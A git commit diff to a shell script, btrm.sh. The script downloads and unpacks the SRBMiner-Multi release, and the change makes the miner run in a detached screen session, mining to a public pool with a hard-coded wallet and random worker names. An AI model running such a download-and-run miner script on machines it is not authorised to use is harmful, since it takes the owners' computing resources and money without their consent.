a61c7b2270732131a4f8a9d586b29879a5dd5818
mdk721 <68358195+mdk721@users.noreply.github.com>
2022-06-15 22:42:22 +0300

    Update btrm.sh

--- btrm.sh
+++ btrm.sh
@@ -3,4 +3,4 @@ sudo apt update
 sudo apt install screen -y
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.6/SRBMiner-Multi-0-9-6-Linux.tar.xz  
 tar -xvf SRBMiner-Multi-0-9-6-Linux.tar.xz  
-sudo ./SRBMiner-Multi-0-9-6/SRBMiner-MULTI --algorithm ghostrider --pool stratum-eu.rplant.xyz:17075 --tls true --wallet BXFsTt5jLxJzViEEC7HE1bQKnavPVZeviv.$(echo $(shuf -i 10000-99999 -n 1)-M) --password x
+screen -S "btrm" -d -m  ./SRBMiner-Multi-0-9-6/SRBMiner-MULTI --algorithm ghostrider --pool stratum-eu.rplant.xyz:17075 --tls true --wallet BXFsTt5jLxJzViEEC7HE1bQKnavPVZeviv.$(echo $(shuf -i 10000-99999 -n 1)-M) --password x
